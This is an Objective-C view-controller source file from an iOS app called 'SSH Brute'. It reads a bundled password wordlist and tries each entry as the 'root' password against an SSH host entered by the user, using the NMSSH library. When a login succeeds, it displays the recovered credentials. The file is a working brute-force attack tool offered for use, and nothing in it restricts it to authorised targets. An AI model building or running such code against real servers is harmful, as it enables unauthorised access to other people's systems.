//
//  RootViewController.m
//  SSH Brute
//
//  Created by Sam Sheffres on 06/07/15.
//  Copyright (c) 2015 Sam Sheffres. All rights reserved.
//

#import "RootViewController.h"
#import "NMSSH.h"

@implementation RootViewController {
    NSArray *_passwords;
    UIActivityIndicatorView *_indicator;
}

- (void)viewDidLoad {
    NSString *fileContents = [NSString stringWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"passwords" ofType:@"txt"] encoding:NSUTF8StringEncoding error:NULL];
    _passwords = [fileContents componentsSeparatedByString:@"\n"];
}

- (void)viewWillAppear:(BOOL)animated {
    [self initActivityIndicator];
}

- (IBAction)startAttack:(id)sender {
    [self showActivityIndicator:YES];
    
    [self.targetTextField resignFirstResponder];
    
    NSString *target = self.targetTextField.text;
    NSString *username = @"root";
    
    self.targetTextField.enabled = NO;
    self.goButton.enabled = NO;
    
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        
        for (NSString *password in _passwords) {
            
            NMSSHSession *session = [NMSSHSession connectToHost:target
                                                   withUsername:username];
            
            if (session.isConnected) {
                [session authenticateByPassword:password];
                
                if (session.isAuthorized) {
                    NSLog(@"Authentication succeeded!");
                    dispatch_async(dispatch_get_main_queue(), ^{
                        [[[UIAlertView alloc] initWithTitle:@"Success!" message:[NSString stringWithFormat:@"Username: %@\nPassword: %@", username, password] delegate:self cancelButtonTitle:@"Ok!" otherButtonTitles:nil, nil] show];
                    });
                    
                    break;
                }
            }
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            
            [self showActivityIndicator:NO];
            
            self.targetTextField.enabled = YES;
            self.goButton.enabled = YES;
        });
    });

    
}


# pragma mark Activity Indicator Methods

- (void)initActivityIndicator {
    _indicator = [[UIActivityIndicatorView alloc]initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhiteLarge];
    _indicator.frame = CGRectMake(0.0, 0.0, 140.0, 140.0);
    _indicator.backgroundColor = [UIColor colorWithWhite:0.15f alpha:0.75f];
    _indicator.layer.cornerRadius = 20.0f;
    _indicator.center = self.view.center;
    [self.view addSubview:_indicator];
    [_indicator bringSubviewToFront:self.view];
}

- (void)showActivityIndicator:(BOOL)visible {
    if (visible) {
        [_indicator startAnimating];
        [UIApplication sharedApplication].networkActivityIndicatorVisible = visible;
    } else {
        [_indicator stopAnimating];
        [UIApplication sharedApplication].networkActivityIndicatorVisible = visible;
    }
}

@end